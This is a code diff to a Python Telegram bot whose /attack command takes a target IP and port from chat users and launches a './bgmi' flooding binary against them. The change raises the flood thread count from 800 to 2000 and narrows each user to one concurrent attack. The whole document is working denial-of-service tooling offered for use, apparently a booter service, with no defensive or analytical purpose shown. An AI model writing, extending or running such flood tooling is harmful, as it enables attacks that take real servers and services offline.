@@ -7,12 +7,12 @@ from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
 
 USER_FILE = "users.json"
-DEFAULT_THREADS = 800
-DEFAULT_PACKET = 30
+DEFAULT_THREADS = 2000
+DEFAULT_PACKET = 20
 DEFAULT_DURATION = 120  # Set default duration
 
 users = {}
-user_processes = {}  # Dictionary to track processes for each user (now a list)
+user_processes = {}  # Dictionary to track processes for each user
 
 def load_users():
     try:
@@ -50,20 +50,14 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     target_ip = context.args[0]
     port = context.args[1]
 
-    # Check if user has already reached attack limit (2 concurrent attacks)
-    if user_id in user_processes and len(user_processes[user_id]) >= 2:
-        await update.message.reply_text("\u26a0\ufe0f You already have two attacks running. Please wait for one to finish.")
+    if user_id in user_processes:
+        await update.message.reply_text("\u26a0\ufe0f An attack is already running. Please wait for it to finish.")
         return
 
     flooding_command = ['./bgmi', target_ip, port, str(DEFAULT_DURATION), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
     
-    # Ensure the user has an entry in the process tracking dictionary
-    if user_id not in user_processes:
-        user_processes[user_id] = []
-
     # Start the attack in a separate background task
-    task = asyncio.create_task(run_attack(update, flooding_command, user_id))
-    user_processes[user_id].append(task)
+    user_processes[user_id] = asyncio.create_task(run_attack(update, flooding_command, user_id))
 
     await update.message.reply_text(f'✅ Flooding started: {target_ip}:{port} for {DEFAULT_DURATION} seconds.')
 
@@ -78,11 +72,8 @@ async def run_attack(update: Update, command, user_id):
     except Exception as e:
         await update.message.reply_text(f"⚠️ Error: {e}")
     finally:
-        # Remove the completed process from the user's list
         if user_id in user_processes:
-            user_processes[user_id] = [p for p in user_processes[user_id] if p != asyncio.current_task()]
-            if not user_processes[user_id]:  # Clean up empty lists
-                del user_processes[user_id]
+            del user_processes[user_id]  # Cleanup after completion
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not await is_group_chat(update):
